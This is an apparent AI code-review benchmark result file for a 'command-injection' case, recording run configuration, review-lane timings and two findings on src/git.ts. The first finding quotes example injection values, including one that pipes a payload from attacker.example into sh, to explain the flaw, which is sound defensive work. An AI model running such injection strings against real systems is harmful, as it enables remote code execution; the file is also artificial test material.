@@ -1,0 +1,125 @@
+{
+  "schemaVersion": 1,
+  "planEntryId": "59e311b06f07462edb15acde",
+  "caseId": "command-injection",
+  "mode": "balanced",
+  "repetition": 2,
+  "startedAtUtc": "2026-08-27T11:56:43.729Z",
+  "elapsedMs": 396964.516,
+  "timing": {
+    "parentValidationSynthesisMs": 266898.305
+  },
+  "configuration": {
+    "provider": "zai",
+    "model": "glm-5.3",
+    "thinking": "high",
+    "toolPolicy": "frozen-user-tools-with-host-no-write-overrides",
+    "reviewVersion": "1.15.8",
+    "piVersion": "0.84.3",
+    "piSha256": "1c3a5094b54aae9ae98c66516ce8c6578140363d081471ca7e91f9cb8c23dc8a",
+    "piRuntimeSha256": "27d3e60e264accd7997fc74ccfe11e916288579577a86f0e2bd22073103b6fa5",
+    "nodeVersion": "v25.2.1",
+    "nodeSha256": "69512d106bd549ddc26b19d2c3cbeca5adea8255138cbe943b18e3c5ddab5609",
+    "collectorRuntimeVersion": "1.2.15",
+    "collectorRuntimeSha256": "345b4181856b60a5d9cf85fd5d47a54f1904cc852bd05c74d13f17d9bf0fe34a",
+    "reviewConfigSha256": "0bfe9b08aa0a4ba27d3c07e17e858d11386ed48c10c1cdc1ca08e743f2758ce4",
+    "extensionSha256": "3879b85ff84643829265a4d886031bbf1b2b31fcf142c1d7e7ef920286ae1c9c",
+    "promptSha256": "2af9c2c67113d66c822c6c7206b511915302845cd60441b7a69b40e52338488f",
+    "collectorSha256": "865c51cb38802e417e8ff4e96d0d0107bf9fff77c406df491481695520129ecd",
+    "topology": {
+      "passIds": [
+        "overview",
+        "correctness",
+        "correctness-contracts",
+        "security-performance",
+        "performance-resources"
+      ],
+      "shardCount": 1,
+      "maxParallel": 5
+    }
+  },
+  "lanes": [
+    {
+      "id": "overview",
+      "lens": "overview",
+      "status": "complete",
+      "elapsedMs": 12396.972917556763,
+      "provider": "openai-codex",
+      "model": "gpt-5.6-luna"
+    },
+    {
+      "id": "correctness",
+      "lens": "correctness",
+      "status": "complete",
+      "elapsedMs": 61339.87975025177,
+      "provider": "openai-codex",
+      "model": "gpt-5.6-sol"
+    },
+    {
+      "id": "correctness-contracts",
+      "lens": "correctness-contracts",
+      "status": "complete",
+      "elapsedMs": 130061.00258350372,
+      "provider": "openai-codex",
+      "model": "gpt-5.6-sol"
+    },
+    {
+      "id": "security-performance",
+      "lens": "security-performance",
+      "status": "complete",
+      "elapsedMs": 27703.604457855225,
+      "provider": "openai-codex",
+      "model": "gpt-5.6-sol"
+    },
+    {
+      "id": "performance-resources",
+      "lens": "performance-resources",
+      "status": "complete",
+      "elapsedMs": 40099.734749794006,
+      "provider": "openai-codex",
+      "model": "gpt-5.6-sol"
+    }
+  ],
+  "publication": {
+    "artifact": "canonical",
+    "fallback": false
+  },
+  "findings": [
+    {
+      "title": "[P1] Reintroduce argument-array invocation to prevent shell command injection",
+      "body": "The new code interpolates `branch` directly into a shell command string (`const command = \\`git show ${branch}\\``) and executes it through a shell-running `exec`-style API, whereas the removed code passed `branch` as a single literal argument to `git` with no shell interpretation. Any caller-supplied value containing shell metacharacters — e.g. `main; curl attacker.example/payload | sh` or `topic$(command)` — now executes arbitrary commands with the process's privileges, and can also hang the returned promise with injected long-running children (`HEAD; sleep 300`). `showBranch`'s contract (a free-form `branch: string`) is unchanged, so this bites under realistic inputs. Keep the parameter out of the shell: `return execFileAsync(\"git\", [\"show\", branch]);`",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 15,
+        "end": 16
+      }
+    },
+    {
+      "title": "[P1] Replace undefined `execAsync` with a real import/helper",
+      "body": "The added line calls `execAsync(command)`, but no binding named `execAsync` exists in module scope: line 13 imports only `execFile` from `node:child_process` (and `execAsync` is not a Node builtin export), there is no local definition, and a repository-wide search finds no other module that could define it. Every invocation of `showBranch` therefore throws `ReferenceError: execAsync is not defined`, and the file fails to typecheck (TS2304) as the repo stands. If the intent was to switch to shell `exec`, it still needs a real promisified helper; otherwise restore the previous `execFileAsync` call.",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 16,
+        "end": 16
+      }
+    }
+  ],
+  "artifacts": [
+    {
+      "kind": "lane-artifacts",
+      "path": "artifacts/59e311b06f07462edb15acde-lane-artifacts.json",
+      "sha256": "66a161d1d60651e546ba091a2df57177d6a11d8158f484c30f22973a5d22dc98",
+      "bytes": 196753
+    },
+    {
+      "kind": "canonical-review",
+      "path": "artifacts/59e311b06f07462edb15acde-canonical-review.json",
+      "sha256": "635b421c99d9d7476d8a44dd04cffec2483c5607ff52407d727d8e4c8977c505",
+      "bytes": 5927
+    }
+  ]
+}
